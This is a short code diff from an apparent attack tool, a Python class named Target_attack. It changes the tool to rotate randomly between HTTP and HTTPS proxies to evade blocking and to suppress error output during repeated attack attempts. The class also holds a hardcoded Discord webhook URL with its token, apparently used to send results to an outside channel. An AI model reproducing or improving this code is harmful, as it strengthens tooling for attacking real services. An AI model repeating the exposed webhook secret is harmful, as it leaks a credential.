@@ -220,7 +220,9 @@ class Target_attack():
 
     def proxies(self):
         self.proxy = str(random.choice(self.PROXIES))
-        self.Reproxy = {'http': f'{self.proxy}'}
+        self.random = [{'http': f'{self.proxy}'},{'https': f'{self.proxy}'}]
+        self.Reproxy = random.choice(self.random)
+        return self.Reproxy
 
     def send_discord_webhook(self):
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/837368687605710849/KucsMvDc9kJ9PgJrtSOKZWHavOy7uN56u_Kg_iwZU1bZC-iut78tSWIZ0t6bkw8ZkYLX')
@@ -329,7 +331,8 @@ class Target_attack():
                                 print(f"\r  Attempt : {self.attemp} / Error : {self.Er} / Rs : {self.Rs}", end="")
                                 return resp
         except Exception as e:
-            print(e)
+            pass
+            #print(e)
     def Attack(self):
         while self.run:
             self.be_for_Attack()
